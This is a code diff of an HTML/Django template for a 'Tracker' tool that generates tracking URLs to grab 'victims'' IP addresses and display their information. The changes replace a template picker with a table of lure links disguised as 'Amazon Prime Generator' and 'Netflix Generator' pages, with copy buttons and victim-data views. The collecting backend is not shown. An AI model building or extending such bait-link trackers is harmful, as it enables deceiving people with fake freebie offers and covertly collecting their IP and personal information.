@@ -55,39 +55,9 @@
 }
 </style>
 
-{% if get %}
-
-<header class="masthead sticky-top"><br>
-  <div class="container h-100">
-    <div class="row h-100 align-items-center">
-      <br>
-      <div class="jumbotron">
-        <h1 class="display-4 text-center"><strong>Tracker</strong></h1>
-        <br>
-        <p class="lead text-center">Track your victims by generating a dynamic URL that will grab your victims IP address and display thier information.</p>
-        <hr class="my-4">
-        <div class="text-center">
-            <form name="searchform" method="POST" action="" > {% csrf_token %}
-            <p class="card-text">Choose Template for Victim Landing Page</p>
-            <div class="dropdown">
-              <select class="btn btn-secondary dropdown-toggle" name="template" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-              <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
-                <option class="dropdown-item" value="0">Free Amazon Prime</option>
-                <option class="dropdown-item" value="1">Free Netflix</option>
-              </div></select>
-            </div>
-            <br>
-            <input class="btn btn-primary btn-lg" id="searchsubmit" value="Start Tracking" type="submit"></input>
-          </form>
-        </div>
-      </div>
-  </div>
-</header>
-
-
-{% endif %}
 
 <script>
+
 function refresh(){
   document.location.reload();
   }
@@ -95,25 +65,68 @@ function refresh(){
 
 <center>
 
-{% if url %}
 
   <br>
-  <div class="card text-center">
-    <div class="card-header">
-      Tracking URL
-    </div>
-    <div class="card-body" >
-      
-          <p class="card-text"><strong>Copy this : </strong> {{url}}</p>
-    </div>
-    </div>
+  <div class="table-responsive table-body">
+
+    <table class="table table-hover table-striped table-light table-bordered">
+      <thead>
+        <tr>
+          <th scope="col"><center>Template</center></th>
+          <th scope="col"><center>Tracking URL</center></th>
+          <th scope="col"></th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><center>Amazon Prime Generator</center></td>
+          <td><center>{{url.1}}</center></td>
+          <td><center><button type="submit" value="query" id="btn" data-clipboard-text="{{url.1}}" data-toggle="button" aria-pressed="false" class="btn btn-primary btn-sm">Copy</button></center></td>
+        </tr>
+        <tr>
+          <td><center>Netflix Generator</center></td>
+          <td><center>{{url.2}}</center></td>
+          <td><center><button type="submit" value="query" id="btn2" data-clipboard-text="{{url.2}}" data-toggle="button" aria-pressed="false" class="btn btn-primary btn-sm">Copy</button></center></td>
+        </tr>
+      </tbody>
+    </table>
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script>
+
+<script>
+  var btn = document.getElementById('btn');
+  var clipboard = new ClipboardJS(btn);
+
+  clipboard.on('success', function(e) {
+      console.log(e);
+  });
+
+  clipboard.on('error', function(e) {
+      console.log(e);
+  });
+  </script>
+
+<script>
+  var btn = document.getElementById('btn2');
+  var clipboard = new ClipboardJS(btn);
+
+  clipboard.on('success', function(e) {
+      console.log(e);
+  });
+
+  clipboard.on('error', function(e) {
+      console.log(e);
+  });
+  </script>
+
+  </div>
 
   <br>
   {% if victim == None %}
     <a href="javascript:refresh();" type="button" class="btn btn-secondary">Refresh</a>
   {% endif %}
 
-{% endif %}
+
 
 {% if victim %}
   <br>
@@ -162,8 +175,6 @@ function refresh(){
 <br>
 <br>
 
-
-<br><br>
 <script> 
         function Confirm() { 
             var result = confirm("Do you want to flush all Victim Data?"); 
